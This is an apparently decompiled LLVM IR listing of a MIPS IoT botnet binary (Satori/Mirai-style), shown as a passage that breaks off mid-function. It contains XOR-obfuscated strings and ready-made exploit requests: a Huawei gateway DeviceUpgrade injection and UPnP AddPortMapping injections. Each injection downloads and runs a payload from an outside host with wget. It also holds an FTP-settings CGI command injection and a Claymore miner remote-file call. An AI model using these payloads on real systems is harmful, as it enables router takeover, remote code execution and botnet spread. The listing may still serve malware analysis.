source_filename = "test"
target datalayout = "e-p:32:32:32-f80:32:32"

%sockaddr = type { i32, [14 x i8] }
%rlimit = type { i32, i32 }
%tms = type { i32, i32, i32, i32 }
%timespec = type { i32, i32 }
%sigaction = type { void (i32)*, i32, void ()*, %_TYPEDEF_sigset_t }
%_TYPEDEF_sigset_t = type { [1 x i32] }
%stat = type { i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32 }

@v0 = internal unnamed_addr global i32 0
@v1 = internal unnamed_addr global i32 0
@a0 = internal unnamed_addr global i32 0
@a1 = internal unnamed_addr global i32 0
@a2 = internal unnamed_addr global i32 0
@a3 = internal unnamed_addr global i32 0
@s0 = internal unnamed_addr global i32 0
@s1 = internal unnamed_addr global i32 0
@s2 = internal unnamed_addr global i32 0
@s3 = internal unnamed_addr global i32 0
@s6 = internal unnamed_addr global i32 0
@s7 = internal unnamed_addr global i32 0
@t9 = internal unnamed_addr global i32 0
@gp = internal unnamed_addr global i32 0
@sp = internal unnamed_addr global i32 0
@fp = internal unnamed_addr global i32 0
@ra = internal unnamed_addr global i32 0
@0 = external global i32
@global_var_4499bc.1 = local_unnamed_addr global i32 0
@global_var_4499c8.2 = local_unnamed_addr global i32 4521984
@global_var_44980c.4 = global i32 0
@global_var_449820.5 = local_unnamed_addr global i32* @global_var_44980c.4
@global_var_449824.6 = global i32 -1
@global_var_449b90.7 = local_unnamed_addr global i32 0
@global_var_4499cc.8 = local_unnamed_addr global i32 4259840
@global_var_449a70.9 = local_unnamed_addr global i32 0
@global_var_449c94.10 = global i32 0
@global_var_449a78.11 = local_unnamed_addr global i32 0
@global_var_449cb0.12 = global i32 0
@global_var_449aa8.13 = local_unnamed_addr global i32* @global_var_449cb0.12
@global_var_449c08.14 = local_unnamed_addr global i32 4219200
@global_var_449cb4.15 = global i32 0
@global_var_449b64.16 = local_unnamed_addr global i32* @global_var_449cb4.15
@global_var_449b3c.17 = local_unnamed_addr global i32 4210396
@global_var_449b70.18 = local_unnamed_addr global i32 4218800
@global_var_449b74.19 = local_unnamed_addr global i32 4195776
@global_var_449b5c.20 = local_unnamed_addr global i32 4195868
@global_var_4082a0.21 = constant i32 2134799476
@global_var_4082b8.22 = constant i32 1714893427
@global_var_4082d0.23 = constant i32 1999136885
@global_var_4082d8.24 = constant i32 1781036902
@global_var_4082e0.25 = constant i32 1646813823
@global_var_4082e8.26 = constant i32 1999136885
@global_var_4082f8.27 = constant i32 1630013283
@global_var_408300.28 = constant i32 910111588
@global_var_408314.29 = constant i32 1902333813
@global_var_408320.30 = constant i32 1918987364
@global_var_40832c.31 = constant i32 1651077759
@global_var_40833c.32 = constant i32 1852138848
@global_var_408348.33 = constant i32 1213682516
@global_var_408358.34 = constant i32 1902339189
@global_var_408364.35 = constant i32 1886807650
@global_var_408370.36 = constant i32 1701208932
@global_var_408388.37 = constant i32 1701208932
@global_var_4083ac.38 = constant i32 1832138359
@global_var_4083c4.39 = constant i32 846015792
@global_var_4083d0.40 = constant i32 1801603937
@global_var_4083dc.41 = constant i32 1614177892
@global_var_4083f4.42 = constant i32 1315323989
@global_var_408400.43 = constant i32 695497332
@global_var_408414.44 = constant i32 1999136885
@global_var_408424.45 = constant i32 695235188
@global_var_408438.46 = constant i32 695693940
@global_var_40844c.47 = constant [51 x i8] c"%|cn=%+7%'tmihwu%d%=)5%7'+j%sbho%c%=njbiXubuheshz%\00"
@global_var_408480.48 = constant [53 x i8] c"%|cn=%+7%'tmihwu%d%=)5%7'+j%sbho%c%=njbiXub`tsfs6sz%\00"
@global_var_449b30.49 = local_unnamed_addr global i32 4216688
@global_var_449afc.50 = local_unnamed_addr global i32 4210808
@global_var_449b8c.51 = local_unnamed_addr global i32 4210308
@global_var_449b08.52 = local_unnamed_addr global i32 4195024
@global_var_449c30.53 = local_unnamed_addr global i32 4195684
@global_var_400ba0.54 = constant i32 -1883504624
@global_var_449a9c.55 = local_unnamed_addr global i32 4214704
@global_var_400bb8.56 = constant i32 4231201
@global_var_449c54.57 = local_unnamed_addr global i32 4213536
@global_var_400d44.58 = constant [3 x i8] c"(B\00"
@global_var_449ac8.59 = local_unnamed_addr global i32 4210440
@global_var_449a6c.60 = local_unnamed_addr global i32 4214048
@global_var_449bb8.61 = local_unnamed_addr global i32 4195352
@global_var_449b14.62 = local_unnamed_addr global i32 4215872
@global_var_400e50.63 = constant i32 -1883504624
@global_var_400f10.64 = constant i32 -1883504624
@global_var_449c14.65 = local_unnamed_addr global i32 4214960
@global_var_400f60.66 = constant i32 -1883504624
@global_var_400fd8.67 = constant i32 -1883504624
@global_var_449c28.68 = local_unnamed_addr global i32 4210540
@global_var_40103c.69 = constant i32 -1883504624
@global_var_4010b4.70 = constant i32 -1883504624
@1 = constant i32 788529152
@global_var_4041c4.73 = constant [3 x i8] c"$\09\00"
@global_var_401198.74 = constant i32 -1883504624
@global_var_449ba0.75 = local_unnamed_addr global i32 4214608
@global_var_449a7c.76 = local_unnamed_addr global i32 4215568
@global_var_449c00.77 = local_unnamed_addr global i32 4221168
@global_var_449bf4.78 = local_unnamed_addr global i32 4218704
@global_var_449b84.79 = local_unnamed_addr global i32 4218576
@global_var_449a74.80 = local_unnamed_addr global i32 4213696
@global_var_449c40 = external local_unnamed_addr global i32
@global_var_449d20.82 = global i32 0
@global_var_449abc.83 = local_unnamed_addr global i32 4216544
@global_var_449b98.84 = local_unnamed_addr global i32 4217744
@global_var_449b54.85 = local_unnamed_addr global i32 4218160
@global_var_449c60.86 = local_unnamed_addr global i32 4217840
@global_var_449c1c.87 = local_unnamed_addr global i32 4196912
@global_var_4499d0.88 = local_unnamed_addr global i32 4194304
@global_var_449b60.89 = local_unnamed_addr global i32 4215376
@global_var_449a68.90 = local_unnamed_addr global i32 4196048
@global_var_449b88.91 = local_unnamed_addr global i32 4213952
@global_var_449c3c.92 = local_unnamed_addr global i32 4211784
@global_var_449ba4.93 = local_unnamed_addr global i32 4215472
@global_var_408790.94 = constant i32 167772160
@global_var_449ab8.95 = local_unnamed_addr global i32 4220928
@global_var_449b78.96 = local_unnamed_addr global i32 4202052
@global_var_449b50.97 = local_unnamed_addr global i32 4214144
@global_var_449a80.98 = local_unnamed_addr global i32 4215184
@global_var_408598.99 = constant [5 x i8] c"mips\00"
@global_var_449bc4.100 = local_unnamed_addr global i32 4201780
@global_var_449bd8.101 = local_unnamed_addr global i32 4204640
@global_var_449ad8.102 = local_unnamed_addr global i32 4209768
@global_var_4018d0.103 = constant i32 4227105
@global_var_4019e4.105 = constant i32 4200481
@global_var_449bd0.106 = local_unnamed_addr global i32 4218480
@global_var_449828.107 = local_unnamed_addr global i32 -1
@global_var_449ae0.108 = local_unnamed_addr global i32 4218032
@global_var_4085a0.109 = constant i32 1
@global_var_449c64.110 = local_unnamed_addr global i32 4218256
@global_var_449cc0.111 = local_unnamed_addr global i32 0
@global_var_449ccc.112 = local_unnamed_addr global i32 0
@global_var_449cc4.113 = local_unnamed_addr global i32 0
@global_var_449cc8.114 = local_unnamed_addr global i32 0
@global_var_449b18.115 = local_unnamed_addr global i32 4215280
@global_var_449c34.116 = local_unnamed_addr global i32 4214320
@global_var_449b1c.117 = local_unnamed_addr global i32 4214416
@global_var_449a90.118 = local_unnamed_addr global i32 4216576
@global_var_449b00.119 = local_unnamed_addr global i32 4211688
@global_var_449bac.120 = local_unnamed_addr global i32 4219696
@global_var_449bf0.121 = local_unnamed_addr global i32 4215056
@global_var_449bfc.122 = local_unnamed_addr global i32 4218352
@global_var_449c48.123 = local_unnamed_addr global i32 4216832
@global_var_449cd0.124 = global i32 0
@global_var_449b2c.125 = local_unnamed_addr global i32* @global_var_449cd0.124
@global_var_4024c8.126 = constant i32 -1883504624
@global_var_449bd4.127 = local_unnamed_addr global i32 4211044
@global_var_449a64.128 = local_unnamed_addr global i32 4219888
@global_var_449c68.129 = local_unnamed_addr global i32 4214240
@global_var_449c74.130 = local_unnamed_addr global i32 4221744
@global_var_449c18.131 = local_unnamed_addr global i32 4201872
@global_var_449c70.132 = local_unnamed_addr global i32 4202228
@global_var_4085b0.133 = constant [26 x i8] c"EthDcrMiner64.exe -epool \00"
@global_var_449c0c.134 = local_unnamed_addr global i32 4210344
@global_var_4085cc.135 = constant [8 x i8] c" -ewal \00"
@global_var_4085c8.136 = constant i32 536870912
@global_var_4085d4.137 = constant [27 x i8] c"-mode 1 -mport 3333 -mpsw \00"
@global_var_449adc.138 = local_unnamed_addr global i32 4213452
@global_var_4085f0.139 = constant [3 x i8] c"%x\00"
@global_var_4085f4.140 = constant [71 x i8] c"{\22id\22:0,\22jsonrpc\22:\222.0\22,\22method\22:\22miner_file\22,\22params\22:[\22reboot.bat\22,\22\00"
@global_var_40863c.141 = constant [5 x i8] c"\22]}\22\00"
@global_var_449cd8.142 = local_unnamed_addr global i32 0
@global_var_449cdc.143 = local_unnamed_addr global i32 0
@global_var_408644.144 = constant [62 x i8] c"bdoh,*b,%p`bs,ossw=([(6?2)15)6??)??(e(`,*H,(sjw()d%,9,(sjw()a\00"
@global_var_408684.145 = constant [32 x i8] c"bdoh,*b,%to,(sjw()d%,99,(sjw()a\00"
@global_var_4086a4.146 = constant [11 x i8] c"to,(sjw()a\00"
@global_var_4086c4.147 = constant [10 x i8] c"loginuser\00"
@global_var_40955c.148 = constant [9 x i8] c"\0A\0D=\22 \0A\0D\22\00"
@global_var_449c04.149 = local_unnamed_addr global i32 4210584
@global_var_4086d0.150 = constant i32 989855744
@global_var_4086d4.151 = constant [27 x i8] c"GET /set_ftp.cgi?loginuse=\00"
@global_var_4086f0.152 = constant [11 x i8] c"&loginpas=\00"
@global_var_4086fc.153 = constant [88 x i8] c"&next_url=ftp.htm&port=21&user=ftp&pwd=ftp&dir=/&mode=PORT&upload_interval=0&svr=%24%28\00"
@global_var_408754.154 = constant [17 x i8] c"%29 HTTP/1.0\0D\0A\0D\0A\00"
@global_var_408768.155 = constant [27 x i8] c"GET /ftptest.cgi?loginuse=\00"
@global_var_408784.156 = constant [14 x i8] c" HTTP/1.0\0D\0A\0D\0A\00"
@global_var_449cd4.157 = global i32 0
@global_var_449a8c.158 = local_unnamed_addr global i32* @global_var_449cd4.157
@global_var_449a8d.159 = global i32 1151128576
@global_var_408794.160 = constant [860 x i8] c"POST /ctrlt/DeviceUpgrade_1 HTTP/1.1\0D\0AHost: 127.0.0.1:37215\0D\0AUser-Agent: Hello-World\0D\0AContent-Length: 413\0D\0AConnection: keep-alive\0D\0AAccept: */*\0D\0AAccept-Encoding: gzip, deflate\0D\0AAuthorization: Digest username=\22dslf-config\22, realm=\22HuaweiHomeGateway\22, nonce=\2288645cefb1f9ede0e336e3569d75ee30\22, uri=\22/ctrlt/DeviceUpgrade_1\22, response=\223612f843a42db38f48f59d2a3597e19c\22, algorithm=\22MD5\22, qop=\22auth\22, nc=00000001, cnonce=\22248d1a2560100669\22\0D\0A\0D\0A<?xml version=\221.0\22 ?>\0D\0A    <s:Envelope xmlns:s=\22http://schemas.xmlsoap.org/soap/envelope/\22 s:encodingStyle=\22http://schemas.xmlsoap.org/soap/encoding/\22>\0D\0A    <s:Body><u:Upgrade xmlns:u=\22urn:schemas-upnp-org:service:WANPPPConnection:1\22>\0D\0A    <NewStatusURL>$(/bin/busybox wget -g %d.%d.%d.%d -l /tmp/.f -r /g/h;sh /tmp/.f)</NewStatusURL>\0D\0A<NewDownloadURL></NewDownloadURL>\0D\0A</u:Upgrade>\0D\0A    </s:Body>\0D\0A    </s:Envelope>\0D\0A\0D\0A\00"
@global_var_408af0.161 = constant [3 x i8] c"\0D\0A\00"
@global_var_408af4.162 = constant [14 x i8] c"\22error\22: null\00"
@global_var_408b04.163 = constant [852 x i8] c"POST /picdesc.xml HTTP/1.1\0D\0AHost: 127.0.0.1:52869\0D\0AContent-Length: 620\0D\0AAccept-Encoding: gzip, deflate\0D\0ASOAPAction: urn:schemas-upnp-org:service:WANIPConnection:1#AddPortMapping\0D\0AAccept: */*\0D\0AUser-Agent: Hello-World\0D\0AConnection: keep-alive\0D\0A\0D\0A<?xml version=\221.0\22 ?><s:Envelope xmlns:s=\22http://schemas.xmlsoap.org/soap/envelope/\22 s:encodingStyle=\22http://schemas.xmlsoap.org/soap/encoding/\22><s:Body><u:AddPortMapping xmlns:u=\22urn:schemas-upnp-org:service:WANIPConnection:1\22><NewRemoteHost></NewRemoteHost><NewExternalPort>47450</NewExternalPort><NewProtocol>TCP</NewProtocol><NewInternalPort>44382</NewInternalPort><NewInternalClient>`cd /var;cp $SHELL %s;>%s`</NewInternalClient><NewEnabled>1</NewEnabled><NewPortMappingDescription>syncthing</NewPortMappingDescription><NewLeaseDuration>0</NewLeaseDuration></u:AddPortMapping></s:Body></s:Envelope>\0D\0A\0D\0A\00"
@global_var_408e58.164 = constant [880 x i8] c"POST /picdesc.xml HTTP/1.1\0D\0AHost: 127.0.0.1:52869\0D\0AContent-Length: 642\0D\0AAccept-Encoding: gzip, deflate\0D\0ASOAPAction: urn:schemas-upnp-org:service:WANIPConnection:1#AddPortMapping\0D\0AAccept: */*\0D\0AUser-Agent: Hello-World\0D\0AConnection: keep-alive\0D\0A\0D\0A<?xml version=\221.0\22 ?><s:Envelope xmlns:s=\22http://schemas.xmlsoap.org/soap/envelope/\22 s:encodingStyle=\22http://schemas.xmlsoap.org/soap/encoding/\22><s:Body><u:AddPortMapping xmlns:u=\22urn:schemas-upnp-org:service:WANIPConnection:1\22><NewRemoteHost></NewRemoteHost><NewExternalPort>47450</NewExternalPort><NewProtocol>TCP</NewProtocol><NewInternalPort>44382</NewInternalPort><NewInternalClient>`cd /var;wget http://%d.%d.%d.%d/mips.satori -O -> %s`</NewInternalClient><NewEnabled>1</NewEnabled><NewPortMappingDescription>syncthing</NewPortMappingDescription><NewLeaseDuration>0</NewLeaseDuration></u:AddPortMapping></s:Body></s:Envelope>\0D\0A\0D\0A\00"
@global_var_4091c8.165 = constant [852 x i8] c"POST /picdesc.xml HTTP/1.1\0D\0AHost: 127.0.0.1:52869\0D\0AContent-Length: 620\0D\0AAccept-Encoding: gzip, deflate\0D\0ASOAPAction: urn:schemas-upnp-org:service:WANIPConnection:1#AddPortMapping\0D\0AAccept: */*\0D\0AUser-Agent: Hello-World\0D\0AConnection: keep-alive\0D\0A\0D\0A<?xml version=\221.0\22 ?><s:Envelope xmlns:s=\22http://schemas.xmlsoap.org/soap/envelope/\22 s:encodingStyle=\22http://schemas.xmlsoap.org/soap/encoding/\22><s:Body><u:AddPortMapping xmlns:u=\22urn:schemas-upnp-org:service:WANIPConnection:1\22><NewRemoteHost></NewRemoteHost><NewExternalPort>47450</NewExternalPort><NewProtocol>TCP</NewProtocol><NewInternalPort>44382</NewInternalPort><NewInternalClient>`cd /var;chmod +x %s;./%s`</NewInternalClient><NewEnabled>1</NewEnabled><NewPortMappingDescription>syncthing</NewPortMappingDescription><NewLeaseDuration>0</NewLeaseDuration></u:AddPortMapping></s:Body></s:Envelope>\0D\0A\0D\0A\00"
@global_var_449ce0.166 = global i32 0
@global_var_449bcc.167 = local_unnamed_addr global i32* @global_var_449ce0.166
@global_var_403ca0.168 = constant i32 -1883504616
@global_var_449bbc.169 = local_unnamed_addr global i32 4217648
@global_var_449ae8.170 = local_unnamed_addr global i32 4196880
@global_var_449aec.171 = local_unnamed_addr global i32 4203596
@global_var_449a98.172 = local_unnamed_addr global i32 4209736
@global_var_449b6c.174 = local_unnamed_addr global i32 4214864
@global_var_449a60.175 = local_unnamed_addr global i32 4217936
@global_var_404b0c.176 = constant i32 -1883504624
@global_var_449b48.177 = local_unnamed_addr global i32 4213840
@global_var_449b58.178 = local_unnamed_addr global i32 4214512
@global_var_4499d4.179 = local_unnamed_addr global i32 4214704
@global_var_449b38.180 = local_unnamed_addr global i32 4222380
@global_var_449ba8.181 = local_unnamed_addr global i32 4222372
@global_var_449c58.182 = local_unnamed_addr global i32 4222372
@global_var_449bec.183 = local_unnamed_addr global i32 4222380
@global_var_4499d8.184 = local_unnamed_addr global i32 4214048
@global_var_449acc.185 = local_unnamed_addr global i32 4224048
@global_var_4499dc.186 = local_unnamed_addr global i32 4213696
@global_var_449c10.187 = local_unnamed_addr global i32 4222372
@global_var_449c4c.188 = local_unnamed_addr global i32 4224192
@global_var_449d40.189 = global i32 0
@global_var_449a88.190 = local_unnamed_addr global i32* @global_var_449d40.189
@global_var_449b80.191 = local_unnamed_addr global i32 4225872
@global_var_449b68.192 = local_unnamed_addr global i32 4226544
@global_var_409570.193 = constant i32 -311396
@global_var_449bb4.194 = local_unnamed_addr global i32 4219096
@global_var_449b34.195 = local_unnamed_addr global i32 4219056
@global_var_449d70.196 = global i32 0
@global_var_4499e0.197 = local_unnamed_addr global i32* @global_var_449d70.196
@global_var_449c78.198 = local_unnamed_addr global i32 4223536
@global_var_449cf0.199 = global i32 0
@global_var_449bf8.200 = local_unnamed_addr global i32* @global_var_449cf0.199
@global_var_449aac.201 = local_unnamed_addr global i32 4220288
@global_var_449948.202 = global i32 256
@global_var_449960.203 = global i32* @global_var_449948.202
@global_var_449be0.204 = local_unnamed_addr global i32** @global_var_449960.203
@global_var_449ad0 = external local_unnamed_addr global i32
@global_var_449df0.207 = global i32 0
@global_var_449af4.208 = local_unnamed_addr global i32* @global_var_449df0.207
@global_var_449c38.209 = local_unnamed_addr global i32 4225568
@global_var_449c20.210 = local_unnamed_addr global i32 4220552
@global_var_4063a4.211 = constant i32 -1883504624
@global_var_4499e4.212 = local_unnamed_addr global i32 4216688
@global_var_449970.213 = global i32 0
@global_var_449ae4.214 = local_unnamed_addr global i32* @global_var_449970.213
@global_var_449d10.215 = global i32 0
@global_var_4499e8.216 = local_unnamed_addr global i32* @global_var_449d10.215
@global_var_449c5c.217 = local_unnamed_addr global i32 4222176
@global_var_449af0.218 = local_unnamed_addr global i32 0
@global_var_449b0c.219 = local_unnamed_addr global i32 4223872
@global_var_449b94.220 = local_unnamed_addr global i32 4225712
@global_var_406a24.221 = constant i32 -1883504624
@global_var_449bb0.222 = local_unnamed_addr global i32 4225472
@global_var_406a6c.223 = constant i32 -1883504624
@global_var_406a8c.224 = constant i32 -1883504624
@global_var_406ad4.225 = constant i32 -1883504624
@global_var_409590.226 = constant i32 -306700
@global_var_449c6c.228 = local_unnamed_addr global i32 4225152
@global_var_449c50.229 = local_unnamed_addr global i32 4223952
@global_var_4499f0 = external local_unnamed_addr global i32
@global_var_449d30.232 = global i32 0
@global_var_4499f8.233 = local_unnamed_addr global i32* @global_var_449d30.232
@global_var_4097f0.234 = constant [10 x i8] c"/dev/null\00"
@global_var_449b10.235 = local_unnamed_addr global i32 4226864
@global_var_449d34.236 = local_unnamed_addr global i32 0
@global_var_449b7c.237 = local_unnamed_addr global i32 0
@global_var_449ab4.238 = local_unnamed_addr global i32 0
@global_var_449c44.239 = local_unnamed_addr global i32* @global_var_449d20.82
@global_var_449d24.240 = global i32 0
@global_var_449bdc.241 = local_unnamed_addr global i32* @global_var_449d24.240
@global_var_449aa4.242 = local_unnamed_addr global i32 4227296
@global_var_4499fc.243 = local_unnamed_addr global i32 4222524
@global_var_449a94.244 = local_unnamed_addr global i32 4225200
@global_var_449ab0.245 = local_unnamed_addr global i32 4224960
@global_var_449bc8.246 = local_unnamed_addr global i32 4225056
@global_var_449b44.247 = local_unnamed_addr global i32 4224864
@global_var_449b04.248 = local_unnamed_addr global i32 0
@global_var_449a04.249 = local_unnamed_addr global i32 4220928
@global_var_449b24.250 = local_unnamed_addr global i32 4223776
@global_var_449b20.251 = local_unnamed_addr global i32 4226256
@global_var_449aa0.252 = local_unnamed_addr global i32 4224400
@global_var_449a08.253 = local_unnamed_addr global i32 4216832
@global_var_449d60.254 = global i32 0
@global_var_449ac4.255 = local_unnamed_addr global i32* @global_var_449d60.254
@global_var_449b9c.256 = local_unnamed_addr global i32 4227344
@global_var_407a88.257 = constant i32 -1883504624
@global_var_4499a0.258 = global i32 0
@global_var_449d50.259 = local_unnamed_addr global i32 0
@global_var_449a84.260 = local_unnamed_addr global i32 4227456
@global_var_449c80.261 = global i32 0
@global_var_449b4c.262 = local_unnamed_addr global i32* @global_var_449c80.261
@global_var_449c84.263 = global i32 0
@global_var_449ac0.264 = local_unnamed_addr global i32* @global_var_449c84.263
@global_var_449a0c.265 = local_unnamed_addr global i32 4214320
@global_var_449a10.266 = local_unnamed_addr global i32 4214608
@global_var_449c90.3 = local_unnamed_addr global i8 0
@global_var_449cbc.104 = local_unnamed_addr global i8 0
@global_var_449ce4.173 = external local_unnamed_addr global i8*
@global_var_4084b8.71 = constant [2 x i8] c"/\00"

declare void @__pseudo_call(i32) local_unnamed_addr

declare void @__pseudo_branch(i32) local_unnamed_addr

define i32 @function_400094() local_unnamed_addr {
entry:
  %v0_4000a8 = load i32, i32* @ra, align 4
  %v1_4000c4 = add i32 %v0_4000a8, 301336
  %v2_4000c4 = inttoptr i32 %v1_4000c4 to i32*
  %v3_4000c4 = load i32, i32* %v2_4000c4, align 4
  %v1_4000cc = add i32 %v3_4000c4, 476
  call void @__pseudo_call(i32 %v1_4000cc)
  %v3_4000f4 = load i32, i32* @global_var_4499bc.1, align 4
  %v1_4000fc = add i32 %v3_4000f4, -32304
  call void @__pseudo_call(i32 %v1_4000fc)
  %v4_400118 = load i32, i32* @v0, align 4
  ret i32 %v4_400118
}

define i32 @function_400120() local_unnamed_addr {
entry:
  %v3_400148 = load i8, i8* @global_var_449c90.3, align 1
  %v4_400148 = zext i8 %v3_400148 to i32
  %v1_400150 = icmp eq i8 %v3_400148, 0
  br i1 %v1_400150, label %dec_label_pc_400154, label %dec_label_pc_4001c8

dec_label_pc_400154:                              ; preds = %entry
  %v3_400160 = load i32, i32* bitcast (i32** @global_var_449820.5 to i32*), align 4
  %v1_400170 = icmp eq i32 %v3_400160, 0
  br i1 %v1_400170, label %dec_label_pc_400198, label %dec_label_pc_400178

dec_label_pc_400178:                              ; preds = %dec_label_pc_400154, %dec_label_pc_400178
  %v0_400178 = phi i32 [ %v3_400180, %dec_label_pc_400178 ], [ %v3_400160, %dec_label_pc_400154 ]
  store i32 ptrtoint (i32* @global_var_449824.6 to i32), i32* bitcast (i32** @global_var_449820.5 to i32*), align 4
  call void @__pseudo_call(i32 %v0_400178)
  %v3_400180 = load i32, i32* bitcast (i32** @global_var_449820.5 to i32*), align 4
  %v1_400190 = icmp eq i32 %v3_400180, 0
  br i1 %v1_400190, label %dec_label_pc_400198, label %dec_label_pc_400178

dec_label_pc_400198:                              ; preds = %dec_label_pc_400178, %dec_label_pc_400154
  %v3_400198 = load i32, i32* @global_var_449b90.7, align 4
  %v1_4001a0 = icmp eq i32 %v3_400198, 0
  br i1 %v1_4001a0, label %dec_label_pc_4001c4, label %dec_label_pc_4001a4

dec_label_pc_4001a4:                              ; preds = %dec_label_pc_400198
  %v3_4001b4 = call i32 @unknown_0()
  br label %dec_label_pc_4001c4

dec_label_pc_4001c4:                              ; preds = %dec_label_pc_400198, %dec_label_pc_4001a4
  store i8 1, i8* @global_var_449c90.3, align 1
  br label %dec_label_pc_4001c8

dec_label_pc_4001c8:                              ; preds = %entry, %dec_label_pc_4001c4
  %v4_4001d4 = phi i32 [ %v4_400148, %entry ], [ 1, %dec_label_pc_4001c4 ]
  ret i32 %v4_4001d4

; uselistorder directives
  uselistorder i32 %v3_400180, { 1, 0 }
  uselistorder i8* @global_var_449c90.3, { 1, 0 }
  uselistorder label %dec_label_pc_4001c8, { 1, 0 }
  uselistorder label %dec_label_pc_4001c4, { 1, 0 }
  uselistorder label %dec_label_pc_400178, { 1, 0 }
}

define i32 @function_4001dc() local_unnamed_addr {
dec_label_pc_4001dc:
  %v3_4001fc = load i32, i32* @global_var_449a70.9, align 4
  %v1_400208 = icmp eq i32 %v3_4001fc, 0
  br i1 %v1_400208, label %dec_label_pc_400220, label %dec_label_pc_40020c

dec_label_pc_40020c:                              ; preds = %dec_label_pc_4001dc
  %v1_400210 = call i32 @unknown_0()
  br label %dec_label_pc_400220

dec_label_pc_400220:                              ; preds = %dec_label_pc_4001dc, %dec_label_pc_40020c
  %v3_400220 = load i32, i32* @global_var_4499c8.2, align 4
  %v3_400224 = load i32, i32* @global_var_449a78.11, align 4
  %v1_400228 = add i32 %v3_400220, -26608
  %v2_400228 = inttoptr i32 %v1_400228 to i32*
  %v3_400228 = load i32, i32* %v2_400228, align 4
  %v1_400230 = icmp eq i32 %v3_400228, 0
  %v1_400238 = icmp eq i32 %v3_400224, 0
  %or.cond = or i1 %v1_400238, %v1_400230
  br i1 %or.cond, label %dec_label_pc_400220.dec_label_pc_40024c_crit_edge, label %dec_label_pc_40023c

dec_label_pc_400220.dec_label_pc_40024c_crit_edge: ; preds = %dec_label_pc_400220
  br label %dec_label_pc_40024c

dec_label_pc_40023c:                              ; preds = %dec_label_pc_400220
  %v4_400244 = call i32 @unknown_0()
  br label %dec_label_pc_40024c

dec_label_pc_40024c:                              ; preds = %dec_label_pc_400220.dec_label_pc_40024c_crit_edge, %dec_label_pc_40023c
  %v4_400254 = phi i32 [ %v3_400228, %dec_label_pc_400220.dec_label_pc_40024c_crit_edge ], [ %v4_400244, %dec_label_pc_40023c ]
  ret i32 %v4_400254

; uselistorder directives
  uselistorder label %dec_label_pc_40024c, { 1, 0 }
  uselistorder label %dec_label_pc_400220, { 1, 0 }
}

define i32 @entry_point(i32 %arg1) local_unnamed_addr {
entry:
  %v1_400274 = load i32, i32* @ra, align 4
  %v1_4002ac = add i32 %v1_400274, 301268
  %v2_4002ac = inttoptr i32 %v1_4002ac to i32*
  %v3_4002ac = load i32, i32* %v2_4002ac, align 4
  call void @__pseudo_call(i32 %v3_4002ac)
  %v0_4002cc = load i32, i32* @v0, align 4
  ret i32 %v0_4002cc
}

define i32 @function_4002d0(i32 %arg1) local_unnamed_addr {
dec_label_pc_4002d0:
  %a0.global-to-local = alloca i32, align 4
  %a1.global-to-local = alloca i32, align 4
  %a2.global-to-local = alloca i32, align 4
  %t0.global-to-local = alloca i32, align 4
  %v0.global-to-local = alloca i32, align 4
  %v3_4002dc = load i32, i32* bitcast (i32** @global_var_449aa8.13 to i32*), align 4
  store i32 %v3_4002dc, i32* %v0.global-to-local, align 4
  store i32 %v3_4002dc, i32* %a1.global-to-local, align 4
  %v1_4002ec = urem i32 %arg1, 256
  store i32 %v1_4002ec, i32* %a0.global-to-local, align 4
  br label %dec_label_pc_4002f0

dec_label_pc_4002f0:                              ; preds = %dec_label_pc_4003fc, %dec_label_pc_4002d0
  %v0_400308 = phi i32 [ %v3_4003fc, %dec_label_pc_4003fc ], [ %v3_4002dc, %dec_label_pc_4002d0 ]
  %v1_4002f0 = inttoptr i32 %v0_400308 to i32*
  %v2_4002f0 = load i32, i32* %v1_4002f0, align 4
  store i32 %v2_4002f0, i32* %v0.global-to-local, align 4
  %v1_4002f8 = icmp sgt i32 %v2_4002f0, 0
  %v2_400300 = icmp eq i32 %v1_4002ec, %v2_4002f0
  %or.cond = and i1 %v1_4002f8, %v2_400300
  br i1 %or.cond, label %dec_label_pc_400304, label %dec_label_pc_4003fc

dec_label_pc_400304:                              ; preds = %dec_label_pc_4002f0
  %v1_400308 = add i32 %v0_400308, 10
  %v2_400308 = inttoptr i32 %v1_400308 to i8*
  %v3_400308 = load i8, i8* %v2_400308, align 1
  %v4_400308 = sext i8 %v3_400308 to i32
  store i32 %v4_400308, i32* %v0.global-to-local, align 4
  %v1_400310 = icmp eq i8 %v3_400308, 0
  store i32 0, i32* %a0.global-to-local, align 4
  br i1 %v1_400310, label %dec_label_pc_400410, label %dec_label_pc_400314

dec_label_pc_400314:                              ; preds = %dec_label_pc_400304
  store i32 -19, i32* %t0.global-to-local, align 4
  store i32 -22, i32* @a3, align 4
  store i32 -34, i32* %a2.global-to-local, align 4
  br label %dec_label_pc_400328

dec_label_pc_400328:                              ; preds = %dec_label_pc_400328.dec_label_pc_400328_crit_edge, %dec_label_pc_400314
  %v1_40033c = phi i32 [ %v1_40033c.pre, %dec_label_pc_400328.dec_label_pc_400328_crit_edge ], [ -19, %dec_label_pc_400314 ]
  %v0_400330 = phi i32 [ %v0_4003a0, %dec_label_pc_400328.dec_label_pc_400328_crit_edge ], [ 0, %dec_label_pc_400314 ]
  %v0_400328 = phi i32 [ %v0_400398, %dec_label_pc_400328.dec_label_pc_400328_crit_edge ], [ %v0_400308, %dec_label_pc_400314 ]
  %v1_400328 = add i32 %v0_400328, 4
  %v2_400328 = inttoptr i32 %v1_400328 to i32*
  %v3_400328 = load i32, i32* %v2_400328, align 4
  %v2_400330 = add i32 %v3_400328, %v0_400330
  %v1_400334 = inttoptr i32 %v2_400330 to i8*
  %v2_400334 = load i8, i8* %v1_400334, align 1
  %v3_400334 = zext i8 %v2_400334 to i32
  %v2_40033c = xor i32 %v3_400334, %v1_40033c
  store i32 %v2_40033c, i32* %v0.global-to-local, align 4
  %v1_400340 = trunc i32 %v2_40033c to i8
  store i8 %v1_400340, i8* %v1_400334, align 1
  %v0_400344 = load i32, i32* %a1.global-to-local, align 4
  %v1_400344 = add i32 %v0_400344, 4
  %v2_400344 = inttoptr i32 %v1_400344 to i32*
  %v3_400344 = load i32, i32* %v2_400344, align 4
  %v0_40034c = load i32, i32* %a0.global-to-local, align 4
  %v2_40034c = add i32 %v0_40034c, %v3_400344
  %v1_400350 = inttoptr i32 %v2_40034c to i8*
  %v2_400350 = load i8, i8* %v1_400350, align 1
  %v3_400350 = zext i8 %v2_400350 to i32
  %v1_400358 = load i32, i32* @a3, align 4
  %v2_400358 = xor i32 %v1_400358, %v3_400350
  store i32 %v2_400358, i32* %v0.global-to-local, align 4
  %v1_40035c = trunc i32 %v2_400358 to i8
